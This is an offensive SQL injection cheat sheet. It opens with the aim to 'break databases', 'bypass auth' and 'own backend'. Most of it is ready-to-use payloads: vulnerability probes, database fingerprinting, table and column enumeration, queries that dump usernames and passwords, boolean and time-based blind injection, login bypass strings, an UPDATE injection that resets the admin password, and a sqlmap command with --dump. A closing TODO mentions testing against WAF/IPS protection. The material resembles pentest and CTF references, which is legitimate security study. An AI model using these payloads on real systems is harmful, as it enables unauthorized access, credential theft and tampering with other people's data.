# break databases via malformed input. extract data, bypass auth, own backend.

## quick test payloads

check if vulnerable:
```sql
' OR 1=1-- -
' OR '1'='1
'; WAITFOR DELAY '00:00:05'-- (mssql)
' AND SLEEP(5)-- - (mysql)
```

## database fingerprinting  

detect database type:
```sql
-- mysql/mssql
',nickName=@@version,email='

-- oracle
',nickName=(SELECT banner FROM v$version),email='

-- sqlite  
',nickName=sqlite_version(),email='
```

## data extraction

### sqlite structure enumeration

list tables:
```sql
',nickName=(SELECT group_concat(tbl_name) 
FROM sqlite_master 
WHERE type='table' 
AND tbl_name NOT like 'sqlite_%'),email='
```

get table structure:
```sql
',nickName=(SELECT sql 
FROM sqlite_master 
WHERE type!='meta' AND sql NOT NULL AND name='usertable'),email='
```

dump table contents:
```sql
',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") 
FROM usertable),email='
```

### union-based extraction

find column count:
```sql
' UNION SELECT 1,2,3-- -
```

extract data:
```sql
0 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema = 'database_name'
```

get columns:
```sql
0 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name = 'users'
```

dump credentials:
```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') 
FROM users
```

## blind sql injection

### boolean-based blind

test character by character:
```sql
admin123' AND substring(password,1,1) = 'a'-- -
```

check table existence:
```sql
admin123' UNION SELECT 1,2,3 
FROM information_schema.tables 
WHERE table_schema = 'target_db' AND table_name = 'users';
```

### time-based blind

force delays to confirm:
```sql
-- mysql
admin123' UNION SELECT SLEEP(5),2;--

-- mssql  
admin123'; WAITFOR DELAY '00:00:05'-- -

-- postgresql
admin123'; SELECT pg_sleep(5);-- -
```

## authentication bypass

login bypass:
```sql
' OR 1=1-- -
' OR '1'='1
admin' OR '1'='1'-- -
```

password reset:
```sql
-- update admin password
', password='[SHA256_HASH]' WHERE name='Admin'-- -
```

example hash (Password123):
```
008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601
```

## out-of-band exploitation

multi-stage payload:
```sql
' union select '1'' union select 1,2,3,group_concat(password) from users-- -
```

## automated exploitation

basic sqlmap:
```bash
sqlmap -u "http://target/login" \
       --data="username=admin&password=admin" \
       --level=5 --risk=3 --dbms=sqlite \
       --technique=b --dump
```

## operational notes

- [!] `OR 1=1` on UPDATE/DELETE affects all records - have backups ready
- error messages reveal database type and structure  
- always test multiple injection points (headers, cookies, post params)
- union attacks need matching column count and compatible data types
- blind techniques work when no direct output available

# TODO: test against waf/ips protection